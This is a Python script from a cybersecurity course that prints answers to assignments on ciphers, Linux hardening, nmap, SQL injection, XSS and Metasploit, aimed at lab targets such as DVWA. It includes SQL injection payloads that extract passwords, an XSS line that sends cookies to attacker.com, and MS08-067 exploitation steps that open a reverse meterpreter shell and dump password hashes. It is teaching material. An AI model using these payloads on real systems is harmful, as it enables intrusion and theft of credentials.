"""
JALA Academy - Cyber Security Assignments
==========================================
This file contains demonstrations and explanations for cyber security concepts.
Note: Some assignments require actual system access or vulnerable applications.
"""

import subprocess
import string

print("=" * 70)
print("CYBER SECURITY FUNDAMENTALS")
print("=" * 70)
print()

# Assignment 1: Caesar Cipher
print("Assignment 1: Caesar Cipher Encryption and Decryption")
print("-" * 60)

def caesar_encrypt(text, shift):
    """Encrypt text using Caesar cipher with given shift"""
    result = ""
    for char in text:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            shifted = (ord(char) - ascii_offset + shift) % 26
            result += chr(shifted + ascii_offset)
        else:
            result += char
    return result

def caesar_decrypt(text, shift):
    """Decrypt text using Caesar cipher with given shift"""
    return caesar_encrypt(text, -shift)

# Encrypt "HELLO" with shift of 4
plaintext = "HELLO"
shift = 4
ciphertext = caesar_encrypt(plaintext, shift)
print(f"Plaintext: {plaintext}")
print(f"Shift: {shift}")
print(f"Encrypted: {ciphertext}")

# Decrypt "Jg qh iwtg"
encrypted_text = "Jg qh iwtg"
decrypted = caesar_decrypt(encrypted_text, shift)
print(f"\nCiphertext: {encrypted_text}")
print(f"Decrypted: {decrypted}")
print()

# Assignment 2: RSA Key Generation
print("Assignment 2: RSA Key Pair Generation using OpenSSL")
print("-" * 60)
print("Command to generate RSA private key:")
print("  openssl genrsa -out private_key.pem 2048")
print()
print("Command to extract public key:")
print("  openssl rsa -in private_key.pem -pubout -out public_key.pem")
print()
print("Command to display private key in PEM format:")
print("  openssl rsa -in private_key.pem -text -noout")
print()
print("Command to display public key in PEM format:")
print("  openssl rsa -pubin -in public_key.pem -text -noout")
print()
print("Note: Run these commands in a terminal with OpenSSL installed.")
print()

print("=" * 70)
print("OPERATING SYSTEM SECURITY")
print("=" * 70)
print()

# Assignment 1: User Accounts and File Permissions
print("Assignment 1: Linux User Accounts and File Permissions")
print("-" * 60)
print("Step 1: Create two user accounts")
print("  sudo useradd user1")
print("  sudo useradd user2")
print("  sudo passwd user1")
print("  sudo passwd user2")
print()
print("Step 2: Create a file")
print("  touch /tmp/secure_file.txt")
print("  echo 'Confidential data' > /tmp/secure_file.txt")
print()
print("Step 3: Set ownership and permissions")
print("  sudo chown user1:user1 /tmp/secure_file.txt")
print("  chmod 600 /tmp/secure_file.txt")
print()
print("Explanation:")
print("  - 600 permissions: Owner can read/write, others have no access")
print("  - user1 can read and write")
print("  - user2 has no access")
print()
print("Verification:")
print("  ls -l /tmp/secure_file.txt")
print("  Output: -rw------- 1 user1 user1 ... /tmp/secure_file.txt")
print()

# Assignment 2: Disable SSH Root Login
print("Assignment 2: Disable SSH Root Login")
print("-" * 60)
print("Step 1: Edit SSH configuration file")
print("  sudo nano /etc/ssh/sshd_config")
print()
print("Step 2: Find and modify the line:")
print("  Change: #PermitRootLogin yes")
print("  To:     PermitRootLogin no")
print()
print("Step 3: Restart SSH service")
print("  sudo systemctl restart sshd")
print("  OR")
print("  sudo service ssh restart")
print()
print("Step 4: Verify root login is disabled")
print("  ssh root@localhost")
print("  Expected: Permission denied (publickey,password).")
print()
print("Security Note: This prevents direct root access via SSH,")
print("forcing users to login with regular accounts and use sudo.")
print()

print("=" * 70)
print("NETWORK SECURITY & VPNs")
print("=" * 70)
print()

# Assignment 1: OpenVPN Setup
print("Assignment 1: OpenVPN Setup and IP Verification")
print("-" * 60)
print("Step 1: Install OpenVPN")
print("  sudo apt-get update")
print("  sudo apt-get install openvpn")
print()
print("Step 2: Check IP before VPN connection")
print("  curl ifconfig.me")
print("  Output: Your current public IP address")
print()
print("Step 3: Connect to VPN")
print("  sudo openvpn --config /path/to/config.ovpn")
print()
print("Step 4: Check IP after VPN connection (in new terminal)")
print("  curl ifconfig.me")
print("  Output: VPN server's IP address")
print()
print("Expected Result:")
print("  - Before VPN: Your ISP's public IP")
print("  - After VPN: VPN provider's IP (different from your ISP)")
print()

# Assignment 2: Nmap Port Scanning
print("Assignment 2: Nmap Port Scanning")
print("-" * 60)
print("Command to scan a target machine:")
print("  nmap -sV <target_ip>")
print()
print("Example output and common services:")
print()
print("PORT     STATE SERVICE    VERSION")
print("22/tcp   open  ssh        OpenSSH 8.2p1")
print("  - SSH (Secure Shell): Remote login and command execution")
print()
print("80/tcp   open  http       Apache httpd 2.4.41")
print("  - HTTP: Web server for serving websites")
print()
print("443/tcp  open  https      nginx 1.18.0")
print("  - HTTPS: Secure web server with SSL/TLS encryption")
print()
print("3306/tcp open  mysql      MySQL 8.0.23")
print("  - MySQL: Database server for storing application data")
print()
print("Additional useful nmap commands:")
print("  nmap -p- <target>           # Scan all 65535 ports")
print("  nmap -A <target>            # Aggressive scan (OS, version, scripts)")
print("  nmap -sS <target>           # SYN stealth scan")
print()

print("=" * 70)
print("WEB APPLICATION SECURITY")
print("=" * 70)
print()

# Assignment 1: SQL Injection
print("Assignment 1: SQL Injection Attack")
print("-" * 60)
print("Setup: Install DVWA (Damn Vulnerable Web Application)")
print("  1. Download from: https://github.com/digininja/DVWA")
print("  2. Set security level to 'Low'")
print()
print("SQL Injection Example:")
print("  Vulnerable URL: http://localhost/dvwa/vulnerabilities/sqli/")
print()
print("Test Input in User ID field:")
print("  ' OR '1'='1")
print()
print("This bypasses authentication because:")
print("  Original query: SELECT * FROM users WHERE id = 'USER_INPUT'")
print("  Injected query: SELECT * FROM users WHERE id = '' OR '1'='1'")
print("  Result: Returns all users (1=1 is always true)")
print()
print("More advanced injection to extract data:")
print("  ' UNION SELECT null, concat(user,':',password) FROM users#")
print()
print("This extracts usernames and passwords from the database.")
print()
print("Prevention:")
print("  - Use prepared statements/parameterized queries")
print("  - Input validation and sanitization")
print("  - Least privilege database access")
print()

# Assignment 2: Cross-Site Scripting (XSS)
print("Assignment 2: Cross-Site Scripting (XSS) Attack")
print("-" * 60)
print("Setup: Use DVWA or OWASP Juice Shop")
print("  DVWA: http://localhost/dvwa/vulnerabilities/xss_r/")
print()
print("XSS Payload:")
print("  <script>alert('XSS');</script>")
print()
print("How it works:")
print("  1. Attacker injects malicious JavaScript into a form field")
print("  2. Application stores or reflects the input without sanitization")
print("  3. When victim views the page, the script executes in their browser")
print()
print("Types of XSS:")
print("  - Reflected XSS: Payload in URL, executed immediately")
print("  - Stored XSS: Payload stored in database, executed when viewed")
print("  - DOM-based XSS: Payload manipulates DOM in client-side JavaScript")
print()
print("More dangerous payloads:")
print("  <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>")
print("  This steals the victim's session cookie!")
print()
print("Prevention:")
print("  - Output encoding/escaping")
print("  - Content Security Policy (CSP)")
print("  - Input validation")
print("  - HTTPOnly cookies")
print()

print("=" * 70)
print("ETHICAL HACKING & PENETRATION TESTING")
print("=" * 70)
print()

# Assignment 1: WHOIS and nslookup
print("Assignment 1: WHOIS and nslookup Reconnaissance")
print("-" * 60)
print("WHOIS Query:")
print("  whois example.com")
print()
print("Information gathered:")
print("  - Domain registrar")
print("  - Registration date")
print("  - Expiration date")
print("  - Name servers")
print("  - Registrant contact information")
print()
print("nslookup Query:")
print("  nslookup example.com")
print()
print("Example output:")
print("  Server:  8.8.8.8")
print("  Address: 8.8.8.8#53")
print()
print("  Non-authoritative answer:")
print("  Name:    example.com")
print("  Address: 93.184.216.34")
print()
print("Additional DNS queries:")
print("  nslookup -type=MX example.com    # Mail servers")
print("  nslookup -type=NS example.com    # Name servers")
print("  nslookup -type=TXT example.com   # TXT records")
print()
print("Use case: Reconnaissance phase of penetration testing")
print()

# Assignment 2: Metasploit Exploitation
print("Assignment 2: Metasploit Framework Exploitation")
print("-" * 60)
print("Target: Windows XP with MS08-067 vulnerability")
print()
print("Setup:")
print("  1. Install Metasploit Framework")
print("  2. Set up vulnerable Windows XP VM")
print()
print("Exploitation Steps:")
print()
print("Step 1: Start Metasploit")
print("  msfconsole")
print()
print("Step 2: Search for exploit")
print("  search ms08-067")
print()
print("Step 3: Use the exploit")
print("  use exploit/windows/smb/ms08_067_netapi")
print()
print("Step 4: Show required options")
print("  show options")
print()
print("Step 5: Set target IP")
print("  set RHOSTS <target_ip>")
print("  set RHOST 192.168.1.100")
print()
print("Step 6: Set payload")
print("  set PAYLOAD windows/meterpreter/reverse_tcp")
print()
print("Step 7: Set local IP for reverse connection")
print("  set LHOST <your_ip>")
print("  set LHOST 192.168.1.50")
print()
print("Step 8: Exploit")
print("  exploit")
print()
print("Expected Result:")
print("  [*] Started reverse TCP handler on 192.168.1.50:4444")
print("  [*] Automatically detecting the target...")
print("  [*] Sending stage (175174 bytes) to 192.168.1.100")
print("  [*] Meterpreter session 1 opened")
print()
print("Post-Exploitation Commands:")
print("  sysinfo              # System information")
print("  getuid               # Current user")
print("  hashdump             # Dump password hashes")
print("  screenshot           # Capture screenshot")
print("  shell                # Get command shell")
print()
print("IMPORTANT: Only perform on systems you own or have permission to test!")
print()

print("=" * 70)
print("ADDITIONAL SECURITY CONCEPTS")
print("=" * 70)
print()

print("Password Strength Checker:")
print("-" * 60)

def check_password_strength(password):
    """Check password strength"""
    score = 0
    feedback = []
    
    if len(password) >= 8:
        score += 1
    else:
        feedback.append("Password should be at least 8 characters")
    
    if any(c.isupper() for c in password):
        score += 1
    else:
        feedback.append("Add uppercase letters")
    
    if any(c.islower() for c in password):
        score += 1
    else:
        feedback.append("Add lowercase letters")
    
    if any(c.isdigit() for c in password):
        score += 1
    else:
        feedback.append("Add numbers")
    
    if any(c in string.punctuation for c in password):
        score += 1
    else:
        feedback.append("Add special characters")
    
    strength = ["Very Weak", "Weak", "Fair", "Good", "Strong", "Very Strong"][score]
    
    return strength, score, feedback

# Test passwords
test_passwords = ["password", "Password1", "P@ssw0rd", "MyS3cur3P@ss!", "12345"]

for pwd in test_passwords:
    strength, score, feedback = check_password_strength(pwd)
    print(f"\nPassword: {pwd}")
    print(f"Strength: {strength} (Score: {score}/5)")
    if feedback:
        print(f"Suggestions: {', '.join(feedback)}")

print()
print()

print("Common Security Best Practices:")
print("-" * 60)
print("1. Use strong, unique passwords for each account")
print("2. Enable two-factor authentication (2FA)")
print("3. Keep software and systems updated")
print("4. Use HTTPS for sensitive communications")
print("5. Regular backups of important data")
print("6. Principle of least privilege")
print("7. Network segmentation")
print("8. Regular security audits and penetration testing")
print("9. Employee security awareness training")
print("10. Incident response plan")
print()

print("=" * 70)
print("ALL CYBER SECURITY ASSIGNMENTS COMPLETED!")
print("=" * 70)
print()
print("Note: Many assignments require actual system access or lab environments.")
print("Always practice ethical hacking only on systems you own or have")
print("explicit permission to test. Unauthorized access is illegal!")
